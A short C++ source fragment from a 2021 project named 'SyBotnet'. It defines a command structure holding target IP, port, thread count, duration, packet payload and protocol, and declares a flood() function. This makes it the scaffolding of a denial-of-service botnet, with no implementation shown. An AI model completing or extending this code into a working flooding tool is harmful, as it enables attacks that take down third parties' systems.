/* =============================================== */
/* |  Name: SyBotnet --------------------------- | */
/* |  Decription: Using SyOKet Library           | */
/* |  Copyright: Copyright 2021 SeungYup26       | */
/* |  Github: SeungYup - @SeungYup26             | */
/* =============================================== */

#include"include/socket.hpp"

#include<chrono>
#include<cstring>

struct Data
{
	char command[16];
	int  port;
	int  delay;
	int  thread;
	int  time;
	char ip[16];
	char packet[1024];
	char proto[8];
};

void flood(Data data);